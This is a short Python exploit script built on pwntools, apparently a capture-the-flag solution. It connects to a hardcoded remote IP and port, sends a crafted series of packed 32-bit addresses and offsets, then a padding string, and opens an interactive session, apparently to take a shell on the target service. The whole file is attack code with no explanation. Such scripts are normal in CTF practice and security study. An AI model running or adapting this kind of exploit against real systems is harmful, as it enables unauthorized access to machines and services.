#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwnpwnpwn import *
from pwn import *
import time
#host = "10.211.55.6"
#port = 8888
host = "139.59.241.76"
port = 31335
r = remote(host,port)
r.sendline(str(0x82))
time.sleep(1)
r.send(p32(0xfffff798))
time.sleep(1)
r.send(p32(0x6020d8))
time.sleep(1)
r.send(p32(0xfffff79c))
time.sleep(1)
r.send(p32(0))
time.sleep(1)
r.send(p32(0x10))
time.sleep(1)
r.send(p32(0xc0c0afe6-0x123+0x10cc))
time.sleep(1)
r.send(p32(0x123))
time.sleep(1)
r.sendline("120")
time.sleep(0.2)
r.sendline("a"*24)
r.interactive()
